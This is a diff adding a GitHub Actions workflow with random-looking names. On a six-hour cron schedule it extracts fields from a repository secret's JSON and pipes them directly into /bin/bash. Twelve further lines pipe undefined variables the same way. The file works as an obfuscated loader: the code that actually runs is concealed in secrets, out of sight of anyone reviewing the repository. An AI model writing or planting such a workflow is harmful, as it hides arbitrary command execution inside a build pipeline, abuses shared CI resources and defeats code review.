@@ -1,0 +1,29 @@
+name: debugmarthaforge
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: debugmarthaforge
+        env:
+          xfnp654: ${{ secrets.xfnp654 }}
+        run: |
+          echo $xfnp654 | jq -r .gt96036 | /bin/bash
+          echo $x2733 | jq -r .iqttu8074 | /bin/bash
+          echo $rtky6624 | jq -r .p185 | /bin/bash
+          echo $p9849 | jq -r .faji521 | /bin/bash
+          echo $pd96 | jq -r .hojf3 | /bin/bash
+          echo $f7 | jq -r .ivh96 | /bin/bash
+          echo $po151 | jq -r .airrp8748 | /bin/bash
+          echo $f581 | jq -r .fs13 | /bin/bash
+          echo $q417 | jq -r .ln1245 | /bin/bash
+          echo $a6 | jq -r .onns97 | /bin/bash
+          echo $acl7 | jq -r .q99165 | /bin/bash
+          echo $ugv3 | jq -r .cfod1894 | /bin/bash
+          echo $mt6 | jq -r .k9062 | /bin/bash
+
